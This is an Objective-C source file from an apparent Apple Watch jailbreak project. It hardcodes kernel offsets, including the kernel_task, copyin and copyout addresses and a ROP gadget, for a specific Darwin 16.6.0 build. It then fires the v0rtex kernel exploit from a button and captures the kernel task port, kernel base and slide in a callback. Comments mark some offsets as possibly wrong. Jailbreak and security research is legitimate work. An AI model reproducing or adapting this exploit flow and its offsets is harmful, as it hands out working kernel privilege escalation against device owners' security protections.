//
//  InterfaceController.m
//  OverCl0ck WatchKit Extension
//
//  Created by Ben Sparkes on 25/01/2018.
//  Copyright © 2018 Ben Sparkes. All rights reserved.
//

#import "InterfaceController.h"
#import "offsets.h"
#import "v0rtex.h"

@interface InterfaceController ()
@property (unsafe_unretained, nonatomic) IBOutlet WKInterfaceButton *runButton;
@end


@implementation InterfaceController

- (void)awakeWithContext:(id)context {
    [super awakeWithContext:context];
    // Configure interface objects here.
    
    NSLog(@"awakeWithContext");
    printf("awakeWithContext \n");
}

- (void)willActivate {
    // This method is called when watch view controller is about to be visible to user
    [super willActivate];
    
    NSLog(@"willActivate");
    printf("willActivate \n");
}

- (void)didDeactivate {
    // This method is called when watch view controller is no longer visible
    [super didDeactivate];
    NSLog(@"didDeactivate");
    printf("didDeactivate");
}

uint32_t tfp0;
uint32_t kernel_base;
uint32_t kslide;
uint32_t kernprocaddr;
uint32_t kern_ucred;

kern_return_t cb(task_t kernel_task, uint32_t kbase, uint32_t kernproc_addr, uint32_t kernucred, void *data) {
    tfp0 = kernel_task;
    kernel_base = kbase;
    kslide = kernel_base - 0x80001000;
    kernprocaddr = kernproc_addr;
    kern_ucred = kernucred;
    NSLog(@"Got v0rtex_callback!");
    NSLog(@"tfp0: %x", tfp0);
    NSLog(@"kernel_base: %x", kernel_base);
    NSLog(@"kslide: %x", kslide);
    NSLog(@"kernprocaddr: %x", kernprocaddr);
    NSLog(@"kern_ucred: %x", kern_ucred);
    printf("got v0rtex callback! \n");
    return KERN_SUCCESS;
}

- (IBAction)runTheTingButton {
    NSLog(@"here we go bois");
    
    offsets_t *offset = &(offsets_t) {
        .version = "Darwin Kernel Version 16.6.0: Mon Apr 17 21:59:15 PDT 2017; root:xnu-3789.60.24~28/RELEASE_ARM_T8002",
        .base = 0x80001000,
        .sizeof_task = 0x000003a8, // not working - may not be right
        .task_itk_self = 0x0000009c,
        .task_itk_registered = 0x000001dc,
        .task_bsd_info = 0x00000230,
        .proc_ucred = 0x00000090,
        .ipc_space_is_task = 0x00000018,
        .realhost_special = 0x8,
        .iouserclient_ipc = 0x0000005c, // not working - may not be right
        .vtab_get_retain_count = 0x3,
        .vtab_get_external_trap_for_index = 0x000000e1,
        .zone_map = 0x8040b610,
        .kernel_map = 0x80449034,
        .kernel_task = 0x80449030,
        .realhost = 0x80001000,
        .copyin = 0x80007a54,
        .copyout = 0x80007b30,
        .chgproccnt = 0x8026ef7d,
        .kauth_cred_ref = 0x802522d1,
        .ipc_port_alloc_special = 0x80018625,
        .ipc_kobject_set = 0x80027ba5,
        .ipc_port_make_send = 0x80018273,
        .osserializer_serialize = 0x802f763d,
        .rop_ldr_r0_r0_0xc = 0x8010bac7,
    };
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        int ret = v0rtex(offset, &cb, NULL);
        
        if (ret != 0) {
            dispatch_async(dispatch_get_main_queue(), ^{
                [self exploitFailed];
            });
            
            return;
        }
        
        dispatch_async(dispatch_get_main_queue(), ^{
            [self exploitSucceeded];
        });
    });
}

- (IBAction)testbutton {
    for (int i = 0; i < 10; i++) {
        NSLog(@"the ting has been pressed %d", i);
    }
}

- (void)exploitSucceeded {
    NSLog(@"it fucking worked!?");
    [self.runButton setTitle:@"jailbroke :D"];
}

- (void)exploitFailed {
    NSLog(@"it failed :(");
    [self.runButton setTitle:@"failed :("];
}

@end



